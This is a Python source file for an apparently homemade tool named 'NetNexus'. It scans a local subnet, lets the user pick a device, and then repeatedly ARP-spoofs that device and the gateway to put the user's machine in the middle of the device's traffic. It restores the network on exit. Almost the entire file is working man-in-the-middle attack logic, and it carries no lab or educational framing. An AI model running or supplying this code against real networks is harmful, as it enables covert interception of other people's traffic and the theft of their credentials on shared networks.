import scapy.all as scapy
import os
import time
from core import scanner, spoof

def main():
    # CONFIGURATION
    scapy.conf.iface = "wlan0" # Ensure this matches your 'ip a'
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root. Run with: sudo python main.py")
        return

    print("=== NetNexus: Intercept Mode ===")
    ip_range = "192.168.8.1/24"
    
    devices = scanner.scan(ip_range)
    
    print("\nID\tIP Address\t\tMAC Address\t\tDevice Name")
    for index, device in enumerate(devices):
        print(f"{index}\t{device['ip']}\t\t{device['mac']}\t{device['name']}")

    try:
        choice = int(input("\nSelect Target ID: "))
        target = devices[choice]
        
        gateway_ip = "192.168.8.1"
        target_ip = target['ip']
        target_mac = target['mac']

        print(f"[*] Resolving Gateway MAC...")
        gateway_mac, _ = spoof.get_device_info(gateway_ip)

        print(f"[*] Intercepting {target_ip} ({target['name']})...")
        packet_count = 0
        while True:
            spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
            packet_count += 2
            # This line shows you that the script is NOT frozen
            print(f"\r[+] Packets Sent: {packet_count}", end="") 
            time.sleep(0.5)
            
    except (KeyboardInterrupt, IndexError):
        print("\n[*] Stopping... Restoring network.")
        if 'target_ip' in locals():
            spoof.restore(target_ip, gateway_ip)
            spoof.restore(gateway_ip, target_ip)
        print("[+] Network Restored.")

if __name__ == "__main__":
    main()
